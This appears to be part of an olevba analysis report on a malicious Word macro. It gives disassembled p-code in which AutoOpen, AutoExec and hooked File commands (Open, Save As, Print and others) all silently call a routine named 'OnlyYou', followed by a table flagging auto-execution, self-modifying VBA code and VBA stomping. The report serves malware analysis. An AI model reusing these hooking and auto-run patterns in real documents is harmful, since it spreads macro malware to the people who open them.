' 	FuncDefn (Sub FileNew())
' Line #99:
' 	OnError (Resume Next) 
' Line #100:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #101:
' 	LitDI2 0x0001 
' 	St newfile$ 
' Line #102:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Sub AutoOpen())
' Line #105:
' 	OnError (Resume Next) 
' Line #106:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #107:
' 	EndSub 
' Line #108:
' 	FuncDefn (Sub AutoExec())
' Line #109:
' 	OnError (Resume Next) 
' Line #110:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Sub FileSaveAs())
' Line #113:
' 	OnError (Resume Next) 
' Line #114:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #115:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #116:
' 	EndSub 
' Line #117:
' 	FuncDefn (Sub FilePageSetup())
' Line #118:
' 	OnError (Resume Next) 
' Line #119:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #120:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Sub FilePrint())
' Line #123:
' 	OnError (Resume Next) 
' Line #124:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #125:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #126:
' 	EndSub 
' Line #127:
' 	FuncDefn (Sub FileOpen())
' Line #128:
' 	OnError (Resume Next) 
' Line #129:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #130:
' 	ArgsCall (Call) OnlyYou 0x0000 
' Line #131:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

